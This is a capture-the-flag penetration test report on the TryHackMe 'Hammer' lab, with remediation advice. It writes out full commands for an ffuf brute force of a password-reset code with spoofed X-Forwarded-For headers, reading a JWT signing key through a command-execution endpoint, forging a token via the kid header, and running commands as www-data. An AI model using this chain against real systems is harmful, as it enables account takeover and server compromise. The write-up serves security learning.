# 🔨 TryHackMe: Hammer - Comprehensive Penetration Test Report

**Target:** TryHackMe Room "Hammer"  
**Objective:** Bypass authentication mechanisms to achieve Remote Code Execution (RCE).  
**Platform:** TryHackMe (Lab Environment)  
**Date:** 11 - 13 October 2026  
**Author:** NISHANT SAINI (BCA Student - Cyber Security Practice)  
**Overall Risk:** 🔴 **CRITICAL**  
**Flags Captured:** 2 of 2 (`THM{AuthBypass3D}`, `THM{RUNANYCOMMAND1337}`)

---

## 📌 1. Executive Summary

This report documents a black-box security assessment of the **Hammer** web application, a PHP and Apache service hosted on a TryHackMe lab machine. The goal was to bypass authentication mechanisms, obtain dashboard access, and achieve Remote Code Execution (RCE) on the underlying server.

The assessment succeeded on every objective. The web application relied on weak and client-controlled security controls:
- A guessable 4-digit password-reset code that could be brute-forced by spoofing the `X-Forwarded-For` header.
- A cookie-based client-side access check.
- A JWT signing secret stored in a predictable file.
- A command-execution endpoint that passed user input directly to the operating system.

Chained together, these weaknesses allowed an unauthenticated attacker to take over an account, forge a trusted session token, and run arbitrary commands on the server as the `www-data` user. Immediate remediation is required.

### Severity Count
| Severity | Count | Findings |
| :--- | :--- | :--- |
| **Critical** | 1 | Remote Code Execution through `execute_command.php` |
| **High** | 4 | Insecure password reset (OTP brute force), Rate-limit bypass via `X-Forwarded-For`, JWT forgery through `kid` injection, Weak JWT secret exposed on server |
| **Medium** | 3 | Client-side authorisation bypass (`persistentSession` cookie), JWT exposed in page source, Sensitive error log and directory exposure |
| **Low** | 2 | Session cookie without `HttpOnly` flag, Exposed vendor and `phpMyAdmin` paths |

---

## 🛠️ 2. Scope and Test Environment

The lab target was provisioned by TryHackMe for each attempt. Its IP address changed between sessions.

| Item | Details |
| :--- | :--- |
| **Target Application** | Hammer web portal (Login, Reset Password, Dashboard) |
| **Web Server** | Apache/2.4.41 (Ubuntu) on TCP 1337 |
| **Other Open Service** | OpenSSH 8.2p1 on TCP 22 (not in scope for exploitation) |
| **Target IPs Observed** | 10.146.188.183, 10.146.143.112, 10.144.157.190, 10.144.179.117 |
| **Test Account** | `tester@hammer.thm` (provided / reset during the test) |
| **Attacker Platform** | Kali Linux workstation; Firefox, Chromium, Burp Suite Professional, `jwt.io`, `nano`, `ffuf`, `feroxbuster`, `nmap` |
| **Rules of Engagement** | Lab environment only. No production systems or third-party targets were tested. |

---

## 📋 3. Methodology

The assessment followed a standard black-box web penetration testing workflow, aligned with the **OWASP Web Security Testing Guide**:

| Phase | Objective | Tools Used |
| :--- | :--- | :--- |
| **1. Reconnaissance** | Identify open ports, services and versions | `nmap` |
| **2. Enumeration** | Discover hidden paths, source code hints and exposed files | Browser view-source, `feroxbuster`, SecLists |
| **3. Vulnerability Analysis** | Study authentication, reset and session logic | Firefox DevTools, Burp Repeater |
| **4. Exploitation** | Bypass authentication, brute-force reset code, forge token, execute commands | `ffuf`, Python `requests`, `jwt.io`, Burp Suite |
| **5. Post-exploitation** | Read the protected flag and document impact | Burp Repeater (command endpoint) |
| **6. Reporting** | Document evidence, impact and remediation | This report |

---

## 🚀 4. Step-by-Step Attack Chain

### Step 1: Port Scanning and Service Fingerprinting
**Action:** Full TCP port scan with service and default script detection.
```bash
nmap -sC -sV -p- -min-rate 5000 -T4 10.146.188.183
Observation: Port 22/tcp (OpenSSH 8.2p1) and 1337/tcp (Apache httpd 2.4.41, title 'Login') are open. The PHPSESSID cookie is set without the HttpOnly flag.
Outcome: Attack surface identified: a single web application on port 1337 plus SSH.

https://images/nmap_scan.png

Step 2: Source Code Review of the Login Page
Action: Viewed the raw HTML of the login page to find hidden hints.

text
view-source:http://10.146.188.183:1337/index.php
Observation: The form posts to index.php with fields email and password. A developer comment revealed: Directory naming convention must be hrmr_DIRECTORY_NAME. It also links to reset_password.php.
Outcome: The developer comment revealed a naming pattern (hmr_*) used later to find log directories.

https://images/login_source.png

Step 3: Directory and File Enumeration
Action: Brute-forced web paths to discover hidden resources.

bash
feroxbuster -u http://10.146.188.183:1337/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50 -k
Observation: Discovered reset_password.php (200), hmr_css/bootstrap.min.css, phpmyadmin/, vendor/ (including composer/installed.json and the firebase/php-jwt library), and javascript/. Hitting the guessed hmr_logs directory exposed an error log.
Outcome: Multiple exposed paths were identified, including the vendor directory revealing a JWT library.

https://images/feroxbuster.png

Step 4: Information Disclosure through Error Logs
Action: Opened the discovered log directory and the error log file.

text
http://10.146.188.183:1337/hmr_logs/
http://10.146.188.183:1337/hmr_logs/error.logs
Observation: Directory listing is enabled. The log contains authentication failures for user tester@hammer.thm, attempts against /restricted-area and /admin-login, attempts to read /etc/shadow, and internal server paths like /var/www/html/ and /home/hammerthm/test.php.
Outcome: Confirmed a valid account (tester@hammer.thm), internal file paths and a naming pattern.

https://images/error_logs.png

Step 5: Testing the Password Reset Flow
Action: Submitted the account email to the reset form.

text
POST reset_password.php email=tester@hammer.thm
POST reset_password.php recovery_code=2378&s=140
Observation: The first attempt returned 'Time elapsed. Please try again later.' A later attempt returned 'Rate limit exceeded.' The recovery screen asks for a 4-digit code and shows a countdown timer (~180 seconds).
Outcome: The reset flow uses a short-lived 4-digit code, a visible timer, and a rate limit.

https://images/reset_page.png

Step 6: Rate-Limit Bypass using X-Forwarded-For
Action: Confirmed that the rate limiter trusts a client-supplied header.

text
Burp Repeater: add header 'X-Forwarded-For: 1.1.1.1' to the reset request
Observation: After the rate-limit message appeared, adding the X-Forwarded-For header with a new value allowed the request to proceed again. The server counts requests per client-supplied IP rather than per real connection.
Outcome: Rate-limit bypass confirmed.

https://images/xff_bypass.png

Step 7: Building the Candidate Wordlists
Action: Generated two wordlists: one for all 4-digit recovery codes and one for spoofed IP addresses.

bash
# Generate 4-digit codes
printf "%04d\n" {1..9999} > num.txt

# Generate 9,999 spoofed IP addresses
for i in {1..255}; do for j in {1..255}; do echo 1.1.$i.$j; done; done | head -9999 > ips.txt
Observation: num.txt holds 9,999 codes. ips.txt holds 9,999 unique spoofed IPv4 addresses.
Outcome: Two wordlists ready for a pitchfork-mode brute force.

https://images/wordlists.png

Step 8: Brute-Forcing the Recovery Code with FFUF
Action: Ran a pitchfork attack pairing the code wordlist with the IP wordlist.

bash
ffuf -w num.txt:W1 -w ips.txt:W2 -u http://10.146.188.183:1337/reset_password.php \
-d 'recovery_code=W1&s=174' -b 'PHPSESSID=<session>' \
-H 'X-Forwarded-For: W2' -H 'Content-Type: application/x-www-form-urlencoded' \
-mode pitchfork -fr 'Invalid'
Observation: Around 6,400 requests were sent at ~120-143 req/sec. Responses without 'Invalid' returned status 200 and size 2191 bytes. The valid code matched on several runs (e.g., W1 6443 with W2 1.1.26.68).
Outcome: Recovery code successfully guessed.

https://images/ffuf_attack.png

Step 9: Entering the Recovery Code and Resetting the Password
Action: Submitted the discovered code within the timer window.

text
Browser: http://10.146.188.183:1337/reset_password.php -> 4-Digit Code field
Observation: The correct code moved the flow to the 'Reset Your Password' form. A new password was set for tester@hammer.thm.
Outcome: Full account takeover of the tester account.

https://images/new_password.png

Step 10: Logging in to the Dashboard
Action: Logged in with the reset credentials.

text
Browser login: tester@hammer.thm / <new password>
Observation: Login succeeded and redirected to dashboard.php. The page displays 'Welcome, Thor! - Flag: THM{AuthBypass3D}' and 'Your role: user'.
Outcome: Authentication bypassed. Flag 1 captured.

https://images/dashboard_flag1.png

Step 11: Client-Side Authorisation Bypass with persistentSession Cookie
Action: Reviewed the dashboard source and found a script that checks for a persistentSession cookie.

javascript
function checkTrailUserCookie() {
  const trailUser = getCookie('persistentSession');
  if (!trailUser) { window.location.href = 'logout.php'; }
}
setInterval(checkTrailUserCookie, 1000);
Observation: The check is performed entirely in the browser. Setting persistentSession=yes stops the redirect.
Outcome: Client-side access control can be defeated by editing a cookie.

https://images/persistent_cookie.png

Step 12: Discovering the JWT and Command Endpoint in Page Source
Action: Read the inline JavaScript of the dashboard.

javascript
$.ajax({
  url: 'execute_command.php',
  method: 'POST',
  data: JSON.stringify({command: command}),
  headers: { 'Authorization': 'Bearer ' + jwtToken }
});
Observation: The page embeds a full JWT as a JavaScript variable. The decoded JWT (HS256) contains: iss and aud 'http://hammer.thm', user_id 1, email tester@hammer.thm and role 'user'. The header contains kid '/var/www/mykey.key'.
Outcome: The token and the command endpoint were identified.

https://images/jwt_decode.png

Step 13: Command Execution through the Dashboard
Action: Submitted ls through the dashboard form.

http
POST /execute_command.php HTTP/1.1
Authorization: Bearer <JWT>
Cookie: PHPSESSID=<session>; token=<JWT>; persistentSession=yes

{"command":"ls"}
Observation: The server returned the directory listing of the web root, including 188ade1.key, composer.json, config.php, dashboard.php, execute_command.php, hmr_css, hmr_images, hmr_js, hmr_logs, index.php, logout.php, reset_password.php and vendor.
Outcome: Confirmed OS command injection and Remote Code Execution.

https://images/rce_ls.png

Step 14: Identifying the Signing Secret
Action: Located the file 188ade1.key in the web root.

json
{"command":"cat 188ade1.key"}
Observation: The key file is readable. Its value 56058354efb3daa97ebab00fabd7a7d7 was verified as a valid HS256 secret on jwt.io.
Outcome: JWT signing secret obtained.

https://images/key_extraction.png

Step 15: Forging a JWT through kid Injection
Action: Used jwt.io to create a new token, changing the kid header to point to the key file.

text
Header: {"typ":"JWT","alg":"HS256","kid":"/var/html/188ade1.key"}
Payload: {"iss":"http://hammer.thm","aud":"http://hammer.thm","data":{"user_id":1, "email":"tester@hammer.thm",...}}
Signature: HMAC-SHA256(header.payload,"56058354efb3daa97ebab00fabd7a7d7")
Observation: The server accepted the forged token.
Outcome: Token forgery succeeded.

https://images/jwt_forgery.png

Step 16: Verifying Command Execution as www-data
Action: Ran the id command through the forged-token request.

json
{"command":"id"}
Observation: Response: uid=33(www-data) gid=33(www-data) groups=33(www-data).
Outcome: Commands run as the web server user www-data.

https://images/rce_id.png

Step 17: Reading the Protected Flag File
Action: Used the command endpoint to read the flag file.

json
{"command":"cat /home/ubuntu/flag.txt"}
Observation: Response: THM{RUNANYCOMMAND1337}.
Outcome: Flag 2 captured.

https://images/final_flag.png

🔍 5. Findings Summary
ID	Finding	Severity	Affected Component	Related Step
F-01	OS Command Injection / RCE	🔴 Critical	execute_command.php	13, 16, 17
F-02	Brute-forceable 4-digit Password Reset Code	🟠 High	reset_password.php	8, 9
F-03	Rate Limit Bypass via X-Forwarded-For	🟠 High	reset_password.php, Rate Limiter	6, 8
F-04	JWT Forgery through kid parameter	🟠 High	JWT Validation, 188ade1.key	14, 15
F-05	Weak JWT Secret stored inside Web Root	🟠 High	Web root file 188ade1.key	13, 14
F-06	Client-side Authorisation Bypass	🟡 Medium	dashboard.php JavaScript	11
F-07	JWT and Internal API Details in Page Source	🟡 Medium	dashboard.php	12
F-08	Sensitive Error Log and Directory Listing Exposed	🟡 Medium	/hmr_logs/	4
F-09	Session Cookie without HttpOnly Flag	🔵 Low	PHPSESSID	1
F-10	Exposed vendor/, phpMyAdmin and Library Versions	🔵 Low	/vendor/, /phpmyadmin/	3
🛡️ 6. Detailed Findings & Remediation
F-01: OS Command Injection / Remote Code Execution (Critical)
Description: The execute_command.php endpoint accepts a JSON command field and executes it without validation.

Impact: Full compromise of the web server process.

Remediation: Remove the command endpoint. Implement allow-listed operations. Run web process with minimal privileges.

F-02: Brute-forceable 4-digit Password Reset Code (High)
Description: The recovery code is a 4-digit number (10,000 possibilities).

Impact: Any user account can be taken over.

Remediation: Use cryptographically secure random tokens of at least 128 bits. Single-use, bind to account, short expiry.

F-03: Rate Limit Bypass by trusting X-Forwarded-For (High)
Description: The application trusts the client-supplied header for rate limiting.

Impact: Makes brute force practical.

Remediation: Use REMOTE_ADDR for rate limiting. Only trust X-Forwarded-For from known proxies.

F-04: JWT Forgery through kid parameter and exposed secret (High)
Description: Server selects the JWT verification key using the kid header.

Impact: Attackers can impersonate any user.

Remediation: Do not use kid as a file path. Map kid values to keys from a fixed allow-list.

F-05: Weak JWT Secret stored inside the web root (High)
Description: The HMAC signing secret is stored in plain text inside the public web root.

Impact: Compromise of the signing secret allows forging tokens.

Remediation: Move secrets out of the web root. Use environment variables or a secrets manager.

F-06: Client-side Authorisation Bypass (Medium)
Description: Dashboard enforces access check in JavaScript based on a cookie.

Impact: Client-side checks give no real protection.

Remediation: Enforce all authorisation on the server.

F-07: JWT and internal API details exposed in page source (Medium)
Description: Full JWT and internal endpoint name embedded in inline JavaScript.

Impact: Credentials and internal structure disclosed.

Remediation: Never place tokens or secrets in client-side code.

F-08: Sensitive error log and directory listing exposed (Medium)
Description: /hmr_logs/ is listed publicly and error.logs is readable.

Impact: Gives attackers valid usernames and internal layout.

Remediation: Disable directory listing. Store logs outside the web root.

F-09: Session cookie without HttpOnly flag (Low)
Description: PHPSESSID cookie is accessible to JavaScript.

Impact: Increases the impact of any XSS issue.

Remediation: Set HttpOnly, Secure, and SameSite attributes.

F-10: Exposed vendor directory, phpMyAdmin path (Low)
Description: /vendor/ exposes composer metadata. phpMyAdmin path discovered.

Impact: Reveals library versions.

Remediation: Block web access to vendor/ and restrict phpMyAdmin.

🗺️ 7. Attack Path Overview
Stage	Technique	Result
Recon	Port scan, source review, directory brute force	Reset page and log directory found
Information	Public error log read	Valid account tester@hammer.thm confirmed
Access Control	Rate limit bypass with spoofed X-Forwarded-For	Unlimited recovery attempts
Account Takeover	4-digit OTP brute force (ffuf pitchfork)	Password reset, login as tester
Client Check Bypass	Set persistentSession cookie	Dashboard access (Flag 1)
Key Theft	Command execution, read 188ade1.key	JWT HMAC secret obtained
Token Forgery	Forged JWT with kid pointing to key file	Server accepts attacker token
RCE	Command execution as www-data	Read /home/ubuntu/flag.txt (Flag 2)
🏁 8. Flags Captured
#	Task	Flag	Source
1	Flag value after logging in to the dashboard	THM{AuthBypass3D}	Dashboard welcome message
2	Content of /home/ubuntu/flag.txt	THM{RUNANYCOMMAND1337}	Command endpoint output (Burp Repeater)
📅 9. Remediation Roadmap
Priority	Action	Addresses	Timeline
Immediate	Disable execute_command.php; rotate JWT secret; delete 188ade1.key	F-01, F-04, F-05	0 - 24 hours
Immediate	Invalidate all sessions and tokens; force password reset	F-02, F-04, F-06	0 - 24 hours
Short term	Rebuild reset flow with strong random tokens	F-02, F-03	1 week
Short term	Rate-limit on REMOTE_ADDR; trust proxy headers only from known proxies	F-03	1 week
Short term	Replace kid file-path lookup with fixed key map; pin algorithm	F-04	1 week
Short term	Move all server-side checks out of JavaScript; set cookie flags	F-06, F-07, F-09	2 weeks
Ongoing	Disable directory listing; restrict vendor/, logs and admin tools	F-08, F-10	2 weeks
📝 10. Conclusion
The Hammer application failed at each layer of its security design. Authentication could be bypassed through a weak recovery mechanism that trusted client-supplied headers, authorisation was enforced in the browser, the JWT signing secret was stored where the server could be asked to serve it, and the command endpoint executed arbitrary input.

Each weakness on its own is a serious issue. Together they gave an unauthenticated attacker full command execution on the server. The recommended fixes are straightforward and well documented in OWASP guidance. Prioritising the removal of the command endpoint, the rotation of secrets, and the rebuild of the reset flow will address the critical and high findings. A retest should be performed once the changes are deployed.

📸 11. Screenshot Evidence Gallery
<img width="1920" height="1080" alt="Screenshot_2026-10-11_23_08_42" src="https://github.com/user-attachments/assets/f5deaf7d-4298-4a5e-acd6-23ed098f8b33" />
<img width="1920" height="1080" alt="Screenshot_2026-10-11_23_19_46" src="https://github.com/user-attachments/assets/2ee7e5b5-d817-4970-9c59-05222fca5121" />
<img width="1920" height="1080" alt="Screenshot_2026-10-11_23_19_57" src="https://github.com/user-attachments/assets/0ee08bdf-b870-4bda-a00b-3944e72efc0b" />
<img width="1920" height="1080" alt="Screenshot_2026-10-11_23_55_04" src="https://github.com/user-attachments/assets/7ff67486-5c36-4c91-858c-4d189d724fa0" />
<img width="1920" height="1080" alt="Screenshot_2026-10-11_23_55_34" src="https://github.com/user-attachments/assets/8217dd19-a5ed-4132-9ab9-b5b033778fcc" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_00_00_42" src="https://github.com/user-attachments/assets/6936c0eb-17de-4a56-a4ec-ba536ccab142" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_00_19_59" src="https://github.com/user-attachments/assets/20b29a2c-838c-48f1-9d99-e7ed65d53064" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_00_31_25" src="https://github.com/user-attachments/assets/ce3c3490-6754-4d18-9fee-fdef7e5c386d" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_00_40_06" src="https://github.com/user-attachments/assets/8424491a-8d8b-40be-a72e-9a9370b30059" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_00_40_13" src="https://github.com/user-attachments/assets/22bf72f6-b0b1-4d5a-b5b9-a86b923e20f7" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_00_40_24" src="https://github.com/user-attachments/assets/017b9415-60bc-4fee-ab8e-6a662dfb2f68" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_00_40_27" src="https://github.com/user-attachments/assets/05fd743f-a226-4fbf-96b5-ca8e4bda09a7" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_00_40_56" src="https://github.com/user-attachments/assets/038c14fd-f80a-4eff-8d18-fb20d91d3383" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_00_41_27" src="https://github.com/user-attachments/assets/ef7f0fd2-4e6f-48e5-8aac-5e3fcf307215" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_00_44_20" src="https://github.com/user-attachments/assets/20c0533e-13cd-43f7-a709-f65718faecad" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_00_58_18" src="https://github.com/user-attachments/assets/f811ad6d-4021-4af9-8066-991ab6858845" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_01_03_31" src="https://github.com/user-attachments/assets/c19153d4-b22d-4480-951c-ddb260553f0f" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_01_06_17" src="https://github.com/user-attachments/assets/1eb523c6-b00f-41ae-82c6-b08fd2b99bdf" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_01_06_58" src="https://github.com/user-attachments/assets/7b6676fe-ed1a-4832-825d-90423fca34fa" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_01_10_37" src="https://github.com/user-attachments/assets/ab85e82a-7800-4c0a-ae29-87bc5a9930e6" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_01_30_35" src="https://github.com/user-attachments/assets/12aad14e-5d4d-41bd-91a2-a62a2014e63d" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_01_30_41" src="https://github.com/user-attachments/assets/e94f5dd0-d9e8-4248-9186-62109b2ccfcd" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_01_36_20" src="https://github.com/user-attachments/assets/39f81cd5-08d1-4af5-89d7-2a14b713a9da" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_02_05_31" src="https://github.com/user-attachments/assets/41c0a8cf-efc8-4c6b-a13c-b728a6ef5154" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_02_06_32" src="https://github.com/user-attachments/assets/24b2738c-981e-448c-b298-c31a4760da96" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_02_07_15" src="https://github.com/user-attachments/assets/19732c79-0cfb-4ed4-a25f-5ab13769e3bf" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_02_07_27" src="https://github.com/user-attachments/assets/5e0e910e-2e24-4b31-9923-1c61cb8c5574" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_02_10_50" src="https://github.com/user-attachments/assets/3bc5206a-89bd-4240-9f3a-d60bfacd7a97" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_02_11_27" src="https://github.com/user-attachments/assets/b2224925-64a7-4ec2-a10e-0d7af231aacb" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_02_11_55" src="https://github.com/user-attachments/assets/6ca4c59f-6d11-4a55-9fb9-b8011ca8a062" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_02_14_00" src="https://github.com/user-attachments/assets/be93b337-aafb-4b15-8cc0-896c449dab67" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_22_20_11" src="https://github.com/user-attachments/assets/2a5c0b08-ecd8-4c71-9f09-730cc9a9a45c" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_22_28_34" src="https://github.com/user-attachments/assets/ce2ee0b8-3b80-4e6c-a43b-daff878a0826" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_22_34_06" src="https://github.com/user-attachments/assets/db665190-b58d-42cb-84ca-de2147ed45a5" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_22_37_17" src="https://github.com/user-attachments/assets/372d4cb2-1f73-418c-90d8-76a4acd616e6" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_22_37_34" src="https://github.com/user-attachments/assets/263a5434-71cb-40f4-a92b-e486178ce4ee" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_22_37_38" src="https://github.com/user-attachments/assets/05df8684-2d4a-4264-84cd-0be284a6fab9" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_23_07_23" src="https://github.com/user-attachments/assets/8be666c9-f794-42ff-bc14-6daf845651b7" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_23_07_45" src="https://github.com/user-attachments/assets/75db8fef-3d82-48d5-b2ef-cf1b900b2b66" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_23_07_48" src="https://github.com/user-attachments/assets/ac3cf3bf-f53b-4ee2-8b82-347af8ebbc96" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_23_18_28" src="https://github.com/user-attachments/assets/3979a509-a3f5-43be-abd2-8422c9ed67ad" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_23_18_33" src="https://github.com/user-attachments/assets/e46bbe68-e952-4d20-a5dd-27907f2889bf" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_23_19_39" src="https://github.com/user-attachments/assets/a8b49f4a-7ad8-4180-982b-a73fc891d415" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_23_20_29" src="https://github.com/user-attachments/assets/0acbc5cd-90f7-43ed-90f3-07389c2a324c" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_23_22_04" src="https://github.com/user-attachments/assets/9f957c4c-234b-497c-af6c-3f9ca5b3346c" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_23_22_12" src="https://github.com/user-attachments/assets/fb0cedca-7353-4c11-8354-f0bb1664fe0b" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_23_23_07" src="https://github.com/user-attachments/assets/f9a40a58-51b4-4915-b09b-51ab9459e1c5" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_23_23_14" src="https://github.com/user-attachments/assets/6ea346c3-26fb-4cf8-981b-9c01b75d88db" />
<img width="1920" height="1080" alt="Screenshot_2026-10-12_23_24_21" src="https://github.com/user-attachments/assets/47436238-c929-4460-b987-2a2cc3bced16" />
<img width="1920" height="1080" alt="Screenshot_2026-10-13_00_03_31" src="https://github.com/user-attachments/assets/7f52ecdf-4e8e-4f16-8bf0-bf1b18ecc38b" />
<img width="1920" height="1080" alt="Screenshot_2026-10-13_00_59_50" src="https://github.com/user-attachments/assets/b64cb8f5-a53a-4c5b-b7fe-0d74664550e1" />
<img width="1920" height="1080" alt="Screenshot_2026-10-13_01_00_55" src="https://github.com/user-attachments/assets/781fb4cb-4824-48aa-abad-eef615c3f737" />
<img width="1920" height="1080" alt="Screenshot_2026-10-13_01_01_28" src="https://github.com/user-attachments/assets/17c64ec3-19d5-48e0-8b3c-eeb6ad711ec6" />


⚠️ Appendix B: Disclaimer
This report was produced for a TryHackMe lab exercise for learning purposes. All testing was limited to the lab machine provided by the platform. The techniques described should not be used against systems without explicit written permission.

Prepared by: NISHANT SAINI
Date: 13 October 2026
